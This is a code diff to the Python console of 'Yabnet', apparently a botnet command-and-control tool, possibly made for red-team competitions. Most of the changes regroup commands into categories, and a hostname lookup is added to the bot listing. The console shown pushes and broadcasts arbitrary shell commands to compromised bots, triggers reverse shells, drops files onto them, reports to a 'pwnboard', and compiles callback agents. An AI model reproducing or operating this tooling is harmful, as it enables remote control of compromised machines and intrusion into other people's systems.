@@ -97,6 +97,11 @@ async def get_result(bot_ip):
 class CmdLineApp(cmd2.Cmd):
 
     CUSTOM_CATEGORY = 'My Custom Commands'
+    BOT_CATEGORY = 'Bot-Control'
+    OPERATION_CATEGORY = 'Operation'
+    INFORMATIONAL_CATEGORY = 'Informational'
+    MISC_CATEGORY = 'Misc'
+
     prompt = "Yabnet>> "
 
     def __init__(self):
@@ -155,7 +160,7 @@ ___  ___          _              _____                       _
     pwnboard_parser.add_argument('--stop', action="store_true", help='Stop updating pwnboard')
     pwnboard_parser.add_argument('-u', '--url', type=str, help='Full URL of the pwnboard, including endpoint')
 
-    @cmd2.with_category(CUSTOM_CATEGORY)
+    @cmd2.with_category(OPERATION_CATEGORY)
     @cmd2.with_argparser(pwnboard_parser)
     def do_pwnboard(self, args):
         start = args.start
@@ -177,7 +182,7 @@ ___  ___          _              _____                       _
     login_parser.add_argument('-u', '--username', type=str, help='Username to login with')
     login_parser.add_argument('-p', '--password', type=str, help='Password to login with')
 
-    @cmd2.with_category(CUSTOM_CATEGORY)
+    @cmd2.with_category(OPERATION_CATEGORY)
     @cmd2.with_argparser(login_parser)
     def do_login(self, args):
         remoteserver = args.remote 
@@ -230,9 +235,10 @@ ___  ___          _              _____                       _
     """
     list_parser = argparse.ArgumentParser()
     list_parser.add_argument('-f', '--find', type=str, help='Find specific agent by ip address')
-    @cmd2.with_category(CUSTOM_CATEGORY)
-    #@cmd2.with_argparser()
-    def do_list(self, arg):
+    list_parser.add_argument('hostname', nargs='?', help='Retrieve a list of all team\'s specific hostname machine')
+    @cmd2.with_category(INFORMATIONAL_CATEGORY)
+    @cmd2.with_argparser(list_parser)
+    def do_list(self, args):
         try:
             if URL is None:
                 self.poutput('URL is not set!')
@@ -240,10 +246,15 @@ ___  ___          _              _____                       _
             output_loginfirst = ansi.style("\n\n<Login is Required>\n", fg='red', bg='blue', bold=True)
             self.poutput(output_loginfirst)
 
+        if args.hostname != None:
+            url = URL + '/bot/find'
+            data = {'masterkey': MASTERKEY,'hostname': args.hostname}
+            res = requests.post(url, data=data)
 
-        url = URL + '/bot/list'
-        data = {'masterkey': MASTERKEY}
-        res = requests.post(url, data=data)
+        else:
+            url = URL + '/bot/list'
+            data = {'masterkey': MASTERKEY}
+            res = requests.post(url, data=data)
 
         if len(res.json()) == 0:
             self.poutput(ansi.style("No bots connected with this server at the moment", fg='red', bold=True))
@@ -267,7 +278,14 @@ ___  ___          _              _____                       _
 
             self.poutput(output_botlist)
 
-    @cmd2.with_category(CUSTOM_CATEGORY)
+            if args.hostname != None:
+                bots = ""
+                for bot in botlist:
+                    bots += str(bot['id']) + ","
+
+                self.poutput(ansi.style("Ex) push -t " + bots + " -c whoami\n", fg='blue', bold=True))
+
+    @cmd2.with_category(OPERATION_CATEGORY)
     def do_cleanup(self, args):
         try:
             if URL is None:
@@ -288,7 +306,7 @@ ___  ___          _              _____                       _
     Command: Commands 
     Description: Show all the commands that have been issued. 
     """
-    @cmd2.with_category(CUSTOM_CATEGORY)
+    @cmd2.with_category(INFORMATIONAL_CATEGORY)
     def do_commands(self, arg):
         try:
             if URL is None:
@@ -317,7 +335,7 @@ ___  ___          _              _____                       _
     push_parser.add_argument('-t', '--target', type=str, help="Target bot's ID to push the command")
     push_parser.add_argument('-c', '--command', type=str, help='Command to push')
 
-    @cmd2.with_category(CUSTOM_CATEGORY)
+    @cmd2.with_category(BOT_CATEGORY)
     @cmd2.with_argparser(push_parser)
     def do_push(self, args):
         target_list = args.target.split(",")
@@ -359,7 +377,7 @@ ___  ___          _              _____                       _
     shell_parser = argparse.ArgumentParser()
     shell_parser.add_argument('-t', '--target', type=str, help="Target bot's IP address")
     shell_parser.add_argument('-p', '--port', type=str, help="Reverse shell port")
-    @cmd2.with_category(CUSTOM_CATEGORY)
+    @cmd2.with_category(BOT_CATEGORY)
     @cmd2.with_argparser(shell_parser)
     def do_reverse(self, args):
         url = URL + '/bot/' + args.target + '/push'
@@ -385,7 +403,7 @@ ___  ___          _              _____                       _
     download_parser.add_argument('-f', '--file', type=str, help="Target file to be downloaded to the bot")
     download_parser.add_argument('-d', '--destination', type=str, help="Destination file path which the file will be downloaded to. INCLUDE filename")
 
-    @cmd2.with_category(CUSTOM_CATEGORY)
+    @cmd2.with_category(BOT_CATEGORY)
     @cmd2.with_argparser(download_parser)
     def do_download(self, args):
         # Error checking
@@ -416,7 +434,7 @@ ___  ___          _              _____                       _
     """
     broadcast_parser = argparse.ArgumentParser()
     broadcast_parser.add_argument('-c', '--command', type=str, help='Command to push')
-    @cmd2.with_category(CUSTOM_CATEGORY)
+    @cmd2.with_category(MISC_CATEGORY)
     @cmd2.with_argparser(broadcast_parser)
     def do_broadcast(self, args):
         url = URL + '/bot/broadcast'
@@ -443,7 +461,7 @@ ___  ___          _              _____                       _
     upload_parser = argparse.ArgumentParser()
     upload_parser.add_argument('-f', '--file', type=str, help='Directory path and filename to be uploaded to the server')
     complete_upload = functools.partialmethod(cmd2.Cmd.path_complete, path_filter=os.path.isdir) # Autocompletion for filesystem 
-    @cmd2.with_category(CUSTOM_CATEGORY)
+    @cmd2.with_category(OPERATION_CATEGORY)
     @cmd2.with_argparser(upload_parser)
     def do_upload(self, args):
         url = URL + '/upload'
@@ -459,7 +477,7 @@ ___  ___          _              _____                       _
     Command: files
     Description: View current files stored in the server's uploads directory 
     """
-    @cmd2.with_category(CUSTOM_CATEGORY)
+    @cmd2.with_category(INFORMATIONAL_CATEGORY)
     def do_files(self,args):
         url = URL + '/files'
 
@@ -475,7 +493,7 @@ ___  ___          _              _____                       _
     generate_parser.add_argument('-i','--ip',type=str, help='IP address of yabnet server the agent calls back to', required=True)
     generate_parser.add_argument('-p','--port',type=str, help='Port number of yabnet server the agent calls back to', required=True)
     generate_parser.add_argument('-w','--windows', action="store_true", help='Compile the agent to a windows executable')
-    @cmd2.with_category(CUSTOM_CATEGORY)
+    @cmd2.with_category(OPERATION_CATEGORY)
     @cmd2.with_argparser(generate_parser)
     def do_generate(self, args):
         self.poutput(ansi.style('[+] Compiling golang agent file...', fg='green', bold=True))
@@ -490,12 +508,15 @@ ___  ___          _              _____                       _
 
         self.poutput(ansi.style('[+] Generate command executed successfully.', fg='green', bold=True))
 
-    @cmd2.with_category(CUSTOM_CATEGORY)
+
+
+
+    @cmd2.with_category(MISC_CATEGORY)
     def do_exit(self, arg):
         self.poutput(ansi.style('\nExiting master console, bye.\n', fg='blue', bold=True))
         return True
 
-    @cmd2.with_category(CUSTOM_CATEGORY)
+    @cmd2.with_category(MISC_CATEGORY)
     def do_quit(self, arg):
         self.poutput(ansi.style('\nExiting master console, bye.\n', fg='blue', bold=True))
         return True
